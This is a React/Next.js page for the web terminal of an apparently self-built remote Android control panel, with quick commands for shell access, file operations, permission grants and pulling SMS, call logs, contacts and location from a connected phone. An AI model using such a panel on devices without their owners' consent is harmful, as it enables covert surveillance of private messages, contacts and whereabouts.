'use client'
import { Suspense } from 'react'
import { useEffect, useState, useRef, useCallback } from 'react'
import Sidebar from '@/components/Sidebar'
import { useDevice } from '@/contexts/DeviceContext'
import { Send, Trash2, Circle } from 'lucide-react'

interface HistoryEntry {
  id: string
  command: string
  result: string
  timestamp: string
  exitCode?: number
}

const QUICK_CMDS = [
  'ls /sdcard', 'df -h', 'free -h', 'uname -a', 'whoami',
  'ip addr', 'get_apps', 'get_location', 'ring_device', 'stop_ring',
  'get_sms:20', 'get_calls:20', 'get_contacts:50', 'scan_wifi',
  'get_processes', 'shizuku_status', 'ping',
]

const KNOWN_PREFIXES = [
  'ls_json:', 'read_b64:', 'read_text:', 'write_b64:', 'write_text:',
  'mkdir:', 'delete:', 'move:', 'file_info:', 'shell:', 'shizuku:',
  'pm_grant:', 'pm_revoke:', 'settings_put:', 'settings_get:',
  'pm_list', 'device_info', 'ping', 'shizuku_status',
  'get_location', 'get_sms', 'get_calls', 'get_contacts', 'get_apps',
  'ring_device', 'stop_ring', 'scan_wifi', 'get_processes',
]

function TerminalContent() {
  const { devices, selectedId, setSelectedId, connected } = useDevice()
  const [history, setHistory] = useState<HistoryEntry[]>([])
  const [input, setInput] = useState('')
  const [sending, setSending] = useState(false)
  const [cmdHistory, setCmdHistory] = useState<string[]>([])
  const [histIdx, setHistIdx] = useState(-1)
  const clearedAtRef = useRef<number>(0)
  const outputRef = useRef<HTMLDivElement>(null)
  const inputRef = useRef<HTMLInputElement>(null)

  const fetchHistory = useCallback(async () => {
    if (!selectedId) return
    try {
      const res = await fetch(`/api/device/result?deviceId=${selectedId}`)
      const data = await res.json()
      const all: HistoryEntry[] = data.history ?? []
      const cutoff = clearedAtRef.current
      setHistory(cutoff > 0 ? all.filter(h => new Date(h.timestamp).getTime() > cutoff) : all)
    } catch {}
  }, [selectedId])

  useEffect(() => {
    fetchHistory()
    const iv = setInterval(fetchHistory, 3000)
    return () => clearInterval(iv)
  }, [fetchHistory])

  useEffect(() => {
    if (outputRef.current) outputRef.current.scrollTop = outputRef.current.scrollHeight
  }, [history])

  const normalizeCommand = (raw: string) => {
    const t = raw.trim()
    return KNOWN_PREFIXES.some(p => t.startsWith(p)) ? t : `shell:${t}`
  }

  const sendCommand = async (cmd?: string) => {
    if (!selectedId) return
    const raw = (cmd ?? input).trim()
    if (!raw) return
    const command = normalizeCommand(raw)
    setSending(true)
    try {
      await fetch('/api/device/command', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ deviceId: selectedId, command }),
      })
      setCmdHistory(prev => [command, ...prev.slice(0, 49)])
      setHistIdx(-1)
      setInput('')
    } finally {
      setSending(false)
      inputRef.current?.focus()
    }
  }

  const clearHistory = () => {
    clearedAtRef.current = Date.now()
    setHistory([])
  }

  const handleKeyDown = (e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === 'Enter') { sendCommand() }
    else if (e.key === 'ArrowUp') {
      e.preventDefault()
      const ni = Math.min(histIdx + 1, cmdHistory.length - 1)
      setHistIdx(ni); setInput(cmdHistory[ni] ?? '')
    } else if (e.key === 'ArrowDown') {
      e.preventDefault()
      const ni = Math.max(histIdx - 1, -1)
      setHistIdx(ni); setInput(ni === -1 ? '' : cmdHistory[ni] ?? '')
    }
  }

  return (
    <div className="flex min-h-screen">
      <Sidebar connected={connected} devices={devices} selectedId={selectedId} onSelect={setSelectedId} />

      <main className="flex-1 page-content flex flex-col overflow-hidden">
        <div className="flex flex-col flex-1 px-3 md:px-6 py-3 md:py-6 max-w-5xl mx-auto w-full min-h-0">

          <div className="flex items-center justify-between mb-3">
            <div>
              <h2 className="text-base md:text-xl font-bold text-white">Terminal</h2>
              <p className="text-android-muted text-xs hidden sm:block">Shell · SMS · Calls · Location · Apps</p>
            </div>
            <div className="flex items-center gap-2">
              <div className={`flex items-center gap-1.5 text-xs font-medium px-2.5 py-1.5 rounded-full border ${connected ? 'text-android-green border-android-green/30 bg-android-green/10' : 'text-android-red border-android-red/30 bg-android-red/10'}`}>
                <Circle size={7} className={connected ? 'fill-android-green' : 'fill-android-red'} />
                {connected ? 'Online' : 'Offline'}
              </div>
              <button onClick={clearHistory} className="flex items-center gap-1.5 px-2.5 py-1.5 bg-android-surface border border-android-border rounded-lg text-xs text-android-muted hover:text-android-red hover:border-android-red/50 transition-colors">
                <Trash2 size={12} />
                <span className="hidden sm:inline">Clear</span>
              </button>
            </div>
          </div>

          <div className="flex gap-1.5 mb-2.5 overflow-x-auto pb-1 scrollbar-none">
            {QUICK_CMDS.map(cmd => (
              <button key={cmd} onClick={() => sendCommand(cmd)} disabled={!connected}
                className="shrink-0 px-2.5 py-1.5 bg-android-surface border border-android-border rounded-lg text-xs text-android-muted hover:text-android-green hover:border-android-green/50 transition-colors disabled:opacity-40 disabled:cursor-not-allowed font-mono whitespace-nowrap">
                {cmd}
              </button>
            ))}
          </div>

          <div ref={outputRef} className="flex-1 min-h-0 bg-[#0a0c10] border border-android-border rounded-xl p-3 md:p-4 overflow-y-auto terminal-output">
            {history.length === 0 ? (
              <div className="flex flex-col items-center justify-center h-full text-center gap-2">
                <p className="text-android-muted text-sm">
                  {connected ? 'Type a command or tap a quick button ↑' : 'Connect a device to start'}
                </p>
              </div>
            ) : (
              [...history].reverse().map(entry => (
                <div key={entry.id} className="mb-4">
                  <div className="flex items-center gap-2 mb-1 flex-wrap">
                    <span className="text-android-green text-xs">$</span>
                    <span className="text-white text-xs font-semibold break-all">
                      {entry.command.startsWith('shell:') ? entry.command.slice(6) : entry.command}
                    </span>
                    <span className="text-android-muted text-xs ml-auto">{new Date(entry.timestamp).toLocaleTimeString()}</span>
                    {entry.exitCode !== undefined && entry.exitCode !== 0 && (
                      <span className="text-android-red text-xs">exit {entry.exitCode}</span>
                    )}
                  </div>
                  <pre className="text-android-text text-xs whitespace-pre-wrap break-all pl-3 border-l border-android-border/50">
                    {entry.result || <span className="text-android-muted italic">(no output)</span>}
                  </pre>
                </div>
              ))
            )}
          </div>

          <div className="mt-2.5 flex gap-2">
            <div className="flex-1 flex items-center bg-[#0a0c10] border border-android-border rounded-xl px-3 py-3 gap-2 focus-within:border-android-green/50 transition-colors">
              <span className="text-android-green font-mono text-sm select-none">$</span>
              <input ref={inputRef} type="text" inputMode="text" autoCapitalize="none" autoCorrect="off"
                value={input} onChange={e => setInput(e.target.value)} onKeyDown={handleKeyDown}
                placeholder={connected ? 'Enter command…' : 'No device connected'}
                disabled={!connected || sending}
                className="flex-1 bg-transparent text-android-text font-mono text-sm outline-none placeholder:text-android-muted/50 disabled:opacity-50 min-w-0"
                spellCheck={false} />
            </div>
            <button onClick={() => sendCommand()} disabled={!connected || sending || !input.trim()}
              className="px-4 py-3 bg-android-green text-android-bg rounded-xl hover:bg-android-green/80 disabled:opacity-40 disabled:cursor-not-allowed transition-colors shrink-0 active:scale-95">
              <Send size={16} />
            </button>
          </div>

          <p className="text-xs text-android-muted mt-1.5 hidden md:block">↑↓ navigate history · Enter to send</p>
        </div>
      </main>
    </div>
  )
}

export default function TerminalPage() {
  return (
    <Suspense fallback={<div className="flex min-h-screen items-center justify-center text-android-muted text-sm">Loading…</div>}>
      <TerminalContent />
    </Suspense>
  )
}
